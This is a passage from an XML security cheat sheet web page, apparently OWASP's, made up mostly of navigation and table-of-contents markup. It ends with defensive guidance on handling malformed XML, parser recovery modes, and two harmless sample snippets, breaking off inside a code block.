            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Symfony_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Symfony
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="TLS_Cipher_String_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    TLS Cipher String
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Third_Party_Javascript_Management_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Third Party Javascript Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Threat_Modeling_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Threat Modeling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Transaction_Authorization_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Transaction Authorization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Transport_Layer_Protection_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Transport Layer Protection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Transport_Layer_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Transport Layer Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Unvalidated Redirects and Forwards
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="User_Privacy_Protection_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    User Privacy Protection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Virtual_Patching_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Virtual Patching
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Vulnerability_Disclosure_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerability Disclosure
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerable Dependency Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="Web_Service_Security_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web Service Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XML External Entity Prevention
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    XML Security
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="XML_Security_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    XML Security
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dealing-with-malformed-xml-documents" class="md-nav__link">
    <span class="md-ellipsis">
      Dealing with malformed XML documents
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dealing with malformed XML documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#definition-of-a-malformed-xml-document" class="md-nav__link">
    <span class="md-ellipsis">
      Definition of a malformed XML document
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#handling-malformed-xml-documents" class="md-nav__link">
    <span class="md-ellipsis">
      Handling malformed XML documents
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Handling malformed XML documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#malformed-xml-documents-require-extra-time" class="md-nav__link">
    <span class="md-ellipsis">
      Malformed XML documents require extra time
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applications-processing-malformed-data" class="md-nav__link">
    <span class="md-ellipsis">
      Applications Processing Malformed Data
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Applications Processing Malformed Data">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#malformed-document-to-malformed-document" class="md-nav__link">
    <span class="md-ellipsis">
      Malformed Document to Malformed Document
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#well-formed-document-to-well-formed-document-normalized" class="md-nav__link">
    <span class="md-ellipsis">
      Well-Formed Document to Well-Formed Document Normalized
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#handling-coercive-parsing" class="md-nav__link">
    <span class="md-ellipsis">
      Handling coercive parsing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#violation-of-xml-specification-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Violation of XML Specification Rules
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dealing-with-invalid-xml-documents" class="md-nav__link">
    <span class="md-ellipsis">
      Dealing with invalid XML documents
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dealing with invalid XML documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#document-without-schema" class="md-nav__link">
    <span class="md-ellipsis">
      Document without Schema
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unrestrictive-schema" class="md-nav__link">
    <span class="md-ellipsis">
      Unrestrictive Schema
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#improper-data-validation" class="md-nav__link">
    <span class="md-ellipsis">
      Improper Data Validation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Improper Data Validation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#string-data-types" class="md-nav__link">
    <span class="md-ellipsis">
      String Data Types
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#numeric-data-types" class="md-nav__link">
    <span class="md-ellipsis">
      Numeric Data Types
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Numeric Data Types">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#negative-and-positive-restrictions" class="md-nav__link">
    <span class="md-ellipsis">
      Negative and Positive Restrictions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#divide-by-zero" class="md-nav__link">
    <span class="md-ellipsis">
      Divide by Zero
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#special-values-infinity-and-not-a-number-nan" class="md-nav__link">
    <span class="md-ellipsis">
      Special Values: Infinity and Not a Number (NaN)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#general-data-restrictions" class="md-nav__link">
    <span class="md-ellipsis">
      General Data Restrictions
    </span>
  </a>
  
    <nav class="md-nav" aria-label="General Data Restrictions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#prefixed-values" class="md-nav__link">
    <span class="md-ellipsis">
      Prefixed Values
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ranges" class="md-nav__link">
    <span class="md-ellipsis">
      Ranges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#patterns" class="md-nav__link">
    <span class="md-ellipsis">
      Patterns
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assertions" class="md-nav__link">
    <span class="md-ellipsis">
      Assertions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#occurrences" class="md-nav__link">
    <span class="md-ellipsis">
      Occurrences
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jumbo-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Jumbo Payloads
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Jumbo Payloads">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#traditional-jumbo-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Traditional Jumbo Payloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#small-jumbo-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      "Small" Jumbo Payloads
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schema-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      Schema Poisoning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-schema-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      Local Schema Poisoning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Local Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#embedded-schema" class="md-nav__link">
    <span class="md-ellipsis">
      Embedded Schema
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#incorrect-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      Incorrect Permissions
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-schema-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      Remote Schema Poisoning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Remote Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#man-in-the-middle-mitm-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Man-in-the-Middle (MitM) Attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-cache-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      DNS-Cache Poisoning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evil-employee-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Evil Employee Attack
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xml-entity-expansion" class="md-nav__link">
    <span class="md-ellipsis">
      XML Entity Expansion
    </span>
  </a>
  
    <nav class="md-nav" aria-label="XML Entity Expansion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sample-vulnerable-java-implementations" class="md-nav__link">
    <span class="md-ellipsis">
      Sample Vulnerable Java Implementations
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Sample Vulnerable Java Implementations">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xxe-using-dom" class="md-nav__link">
    <span class="md-ellipsis">
      XXE using DOM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-dom4j" class="md-nav__link">
    <span class="md-ellipsis">
      XXE using DOM4J
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-sax" class="md-nav__link">
    <span class="md-ellipsis">
      XXE using SAX
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-stax" class="md-nav__link">
    <span class="md-ellipsis">
      XXE using StAX
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recursive-entity-reference" class="md-nav__link">
    <span class="md-ellipsis">
      Recursive Entity Reference
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#quadratic-blowup" class="md-nav__link">
    <span class="md-ellipsis">
      Quadratic Blowup
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#billion-laughs" class="md-nav__link">
    <span class="md-ellipsis">
      Billion Laughs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reflected-file-retrieval" class="md-nav__link">
    <span class="md-ellipsis">
      Reflected File Retrieval
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-side-request-forgery" class="md-nav__link">
    <span class="md-ellipsis">
      Server Side Request Forgery
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Server Side Request Forgery">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#external-dns-resolution" class="md-nav__link">
    <span class="md-ellipsis">
      External DNS Resolution
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#external-connection" class="md-nav__link">
    <span class="md-ellipsis">
      External Connection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-retrieval-with-parameter-entities" class="md-nav__link">
    <span class="md-ellipsis">
      File Retrieval with Parameter Entities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Port Scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-forcing" class="md-nav__link">
    <span class="md-ellipsis">
      Brute Forcing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="XSS_Filter_Evasion_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XSS Filter Evasion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="XS_Leaks_Cheat_Sheet.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XS Leaks
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dealing-with-malformed-xml-documents" class="md-nav__link">
    <span class="md-ellipsis">
      Dealing with malformed XML documents
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dealing with malformed XML documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#definition-of-a-malformed-xml-document" class="md-nav__link">
    <span class="md-ellipsis">
      Definition of a malformed XML document
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#handling-malformed-xml-documents" class="md-nav__link">
    <span class="md-ellipsis">
      Handling malformed XML documents
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Handling malformed XML documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#malformed-xml-documents-require-extra-time" class="md-nav__link">
    <span class="md-ellipsis">
      Malformed XML documents require extra time
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applications-processing-malformed-data" class="md-nav__link">
    <span class="md-ellipsis">
      Applications Processing Malformed Data
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Applications Processing Malformed Data">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#malformed-document-to-malformed-document" class="md-nav__link">
    <span class="md-ellipsis">
      Malformed Document to Malformed Document
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#well-formed-document-to-well-formed-document-normalized" class="md-nav__link">
    <span class="md-ellipsis">
      Well-Formed Document to Well-Formed Document Normalized
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#handling-coercive-parsing" class="md-nav__link">
    <span class="md-ellipsis">
      Handling coercive parsing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#violation-of-xml-specification-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Violation of XML Specification Rules
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dealing-with-invalid-xml-documents" class="md-nav__link">
    <span class="md-ellipsis">
      Dealing with invalid XML documents
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Dealing with invalid XML documents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#document-without-schema" class="md-nav__link">
    <span class="md-ellipsis">
      Document without Schema
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unrestrictive-schema" class="md-nav__link">
    <span class="md-ellipsis">
      Unrestrictive Schema
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#improper-data-validation" class="md-nav__link">
    <span class="md-ellipsis">
      Improper Data Validation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Improper Data Validation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#string-data-types" class="md-nav__link">
    <span class="md-ellipsis">
      String Data Types
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#numeric-data-types" class="md-nav__link">
    <span class="md-ellipsis">
      Numeric Data Types
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Numeric Data Types">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#negative-and-positive-restrictions" class="md-nav__link">
    <span class="md-ellipsis">
      Negative and Positive Restrictions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#divide-by-zero" class="md-nav__link">
    <span class="md-ellipsis">
      Divide by Zero
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#special-values-infinity-and-not-a-number-nan" class="md-nav__link">
    <span class="md-ellipsis">
      Special Values: Infinity and Not a Number (NaN)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#general-data-restrictions" class="md-nav__link">
    <span class="md-ellipsis">
      General Data Restrictions
    </span>
  </a>
  
    <nav class="md-nav" aria-label="General Data Restrictions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#prefixed-values" class="md-nav__link">
    <span class="md-ellipsis">
      Prefixed Values
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ranges" class="md-nav__link">
    <span class="md-ellipsis">
      Ranges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#patterns" class="md-nav__link">
    <span class="md-ellipsis">
      Patterns
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assertions" class="md-nav__link">
    <span class="md-ellipsis">
      Assertions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#occurrences" class="md-nav__link">
    <span class="md-ellipsis">
      Occurrences
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jumbo-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Jumbo Payloads
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Jumbo Payloads">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#traditional-jumbo-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Traditional Jumbo Payloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#small-jumbo-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      "Small" Jumbo Payloads
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schema-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      Schema Poisoning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-schema-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      Local Schema Poisoning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Local Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#embedded-schema" class="md-nav__link">
    <span class="md-ellipsis">
      Embedded Schema
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#incorrect-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      Incorrect Permissions
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-schema-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      Remote Schema Poisoning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Remote Schema Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#man-in-the-middle-mitm-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Man-in-the-Middle (MitM) Attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-cache-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      DNS-Cache Poisoning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evil-employee-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Evil Employee Attack
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xml-entity-expansion" class="md-nav__link">
    <span class="md-ellipsis">
      XML Entity Expansion
    </span>
  </a>
  
    <nav class="md-nav" aria-label="XML Entity Expansion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sample-vulnerable-java-implementations" class="md-nav__link">
    <span class="md-ellipsis">
      Sample Vulnerable Java Implementations
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Sample Vulnerable Java Implementations">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xxe-using-dom" class="md-nav__link">
    <span class="md-ellipsis">
      XXE using DOM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-dom4j" class="md-nav__link">
    <span class="md-ellipsis">
      XXE using DOM4J
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-sax" class="md-nav__link">
    <span class="md-ellipsis">
      XXE using SAX
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xxe-using-stax" class="md-nav__link">
    <span class="md-ellipsis">
      XXE using StAX
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#recursive-entity-reference" class="md-nav__link">
    <span class="md-ellipsis">
      Recursive Entity Reference
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#quadratic-blowup" class="md-nav__link">
    <span class="md-ellipsis">
      Quadratic Blowup
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#billion-laughs" class="md-nav__link">
    <span class="md-ellipsis">
      Billion Laughs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reflected-file-retrieval" class="md-nav__link">
    <span class="md-ellipsis">
      Reflected File Retrieval
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-side-request-forgery" class="md-nav__link">
    <span class="md-ellipsis">
      Server Side Request Forgery
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Server Side Request Forgery">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#external-dns-resolution" class="md-nav__link">
    <span class="md-ellipsis">
      External DNS Resolution
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#external-connection" class="md-nav__link">
    <span class="md-ellipsis">
      External Connection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-retrieval-with-parameter-entities" class="md-nav__link">
    <span class="md-ellipsis">
      File Retrieval with Parameter Entities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Port Scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-forcing" class="md-nav__link">
    <span class="md-ellipsis">
      Brute Forcing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="xml-security-cheat-sheet">XML Security Cheat Sheet<a class="headerlink" href="#xml-security-cheat-sheet" title="Permanent link">&para;</a></h1>
<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
<p>While the specifications for XML and XML schemas provide you with the tools needed to protect XML applications, they also include multiple security flaws. They can be exploited to perform multiple types of attacks, including file retrieval, server side request forgery, port scanning, and brute forcing. This cheat sheet will make you aware of how attackers can exploit the different possibilities in XML used in libraries and software using two possible attack surfaces:</p>
<ul>
<li><strong>Malformed XML Documents</strong>: Exploiting vulnerabilities that occur when applications encounter XML documents that are not well-formed.</li>
<li><strong>Invalid XML Documents</strong>: Exploiting vulnerabilities that occur when documents that do not have the expected structure.</li>
</ul>
<h2 id="dealing-with-malformed-xml-documents">Dealing with malformed XML documents<a class="headerlink" href="#dealing-with-malformed-xml-documents" title="Permanent link">&para;</a></h2>
<h3 id="definition-of-a-malformed-xml-document">Definition of a malformed XML document<a class="headerlink" href="#definition-of-a-malformed-xml-document" title="Permanent link">&para;</a></h3>
<p>If an XML document does not follow the W3C XML specification's definition of a well-formed document, it is considered "malformed." <strong>If an XML document is malformed, the XML parser will detect a fatal error, it should stop execution, the document should not undergo any additional processing, and the application should display an error message.</strong> A malformed document can include one or more of the following problems: a missing ending tag, the order of elements into a nonsensical structure, introducing forbidden characters, and so on.</p>
<h3 id="handling-malformed-xml-documents">Handling malformed XML documents<a class="headerlink" href="#handling-malformed-xml-documents" title="Permanent link">&para;</a></h3>
<p><strong>To deal with malformed documents, developers should use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents.</strong> In addition, they should only use well-formed documents, validate the contents of each element, and process only valid values within predefined boundaries.</p>
<h4 id="malformed-xml-documents-require-extra-time">Malformed XML documents require extra time<a class="headerlink" href="#malformed-xml-documents-require-extra-time" title="Permanent link">&para;</a></h4>
<p><strong>A malformed document may affect the consumption of Central Processing Unit (CPU) resources.</strong> In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).</p>
<p><strong>To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document.</strong> Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.</p>
<h3 id="applications-processing-malformed-data">Applications Processing Malformed Data<a class="headerlink" href="#applications-processing-malformed-data" title="Permanent link">&para;</a></h3>
<p><strong>Certain XML parsers have the ability to recover malformed documents.</strong> They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. <strong>Since there are no predefined rules for the recovery process, the approach and results from these parsers may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.</strong></p>
<p>The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:</p>
<h4 id="malformed-document-to-malformed-document">Malformed Document to Malformed Document<a class="headerlink" href="#malformed-document-to-malformed-document" title="Permanent link">&para;</a></h4>
<p>According to the XML specification, the string <code>--</code> (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
<span class="w"> </span><span class="cm">&lt;!-- one</span>
<span class="cm">  &lt;!-- another comment</span>
<span class="cm"> comment --&gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div>
<h4 id="well-formed-document-to-well-formed-document-normalized">Well-Formed Document to Well-Formed Document Normalized<a class="headerlink" href="#well-formed-document-to-well-formed-document-normalized" title="Permanent link">&para;</a></h4>
<p>Certain parsers may consider normalizing the contents of your <code>CDATA</code> sections. This means that they will update the special characters contained in the <code>CDATA</code> section to contain the safe versions of these characters even though is not required:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
<span class="w"> </span><span class="cp">&lt;![CDATA[&lt;script&gt;a=1;&lt;/script&gt;]]&gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div>
<p>Normalization of a <code>CDATA</code> section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;element&gt;</span>
